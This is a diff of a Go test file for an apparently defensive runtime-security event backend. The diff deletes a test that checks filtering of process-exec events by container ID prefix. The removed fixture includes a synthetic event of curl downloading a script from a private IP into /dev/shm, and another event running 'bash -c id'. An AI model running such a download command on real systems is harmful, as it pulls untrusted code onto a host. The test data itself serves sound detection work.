@@ -209,44 +209,6 @@ func TestCapabilityFailsWhenConfiguredBinaryNotExecutable(t *testing.T) {
 	}
 }
 
-func TestBackendFiltersByContainerIDPrefix(t *testing.T) {
-	dir := t.TempDir()
-	policyPath := filepath.Join(dir, "policy.yaml")
-	if err := os.WriteFile(policyPath, []byte("kind: TracingPolicy\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-	eventPath := filepath.Join(dir, "events.jsonl")
-	rawHost := `{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-14T10:00:00Z","docker":""},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:00Z"}`
-	rawNode := `{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/bin/bash","arguments":"-c id","start_time":"2026-06-14T10:00:01Z","docker":"abcdef0123456789"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-14T09:59:59Z"}},"node_name":"node-a","time":"2026-06-14T10:00:01Z"}`
-	if err := os.WriteFile(eventPath, []byte(rawHost+"\n"+rawNode+"\n"), 0o644); err != nil {
-		t.Fatal(err)
-	}
-
-	backend := NewBackend(policyPath, eventPath, "test")
-	backend.ContainerIDPrefix = "abcdef"
-	events, err := backend.Subscribe(context.Background(), contract.CollectionIntent{})
-	if err != nil {
-		t.Fatalf("Subscribe() error = %v", err)
-	}
-	var got []string
-	for ev := range events {
-		got = append(got, ev.SensorEvent.GetBehavior())
-		if ev.SensorEvent.GetContainerId() != "abcdef0123456789" {
-			t.Fatalf("container id = %q", ev.SensorEvent.GetContainerId())
-		}
-	}
-	if len(got) != 1 || got[0] != "process.exec" {
-		t.Fatalf("got behaviors %v, want one process.exec", got)
-	}
-	health, err := backend.Health(context.Background())
-	if err != nil {
-		t.Fatalf("Health() error = %v", err)
-	}
-	if health.EventsSeen != 1 {
-		t.Fatalf("EventsSeen = %d, want filtered count 1", health.EventsSeen)
-	}
-}
-
 func TestBackendFiltersByContainerScope(t *testing.T) {
 	dir := t.TempDir()
 	policyPath := filepath.Join(dir, "policy.yaml")
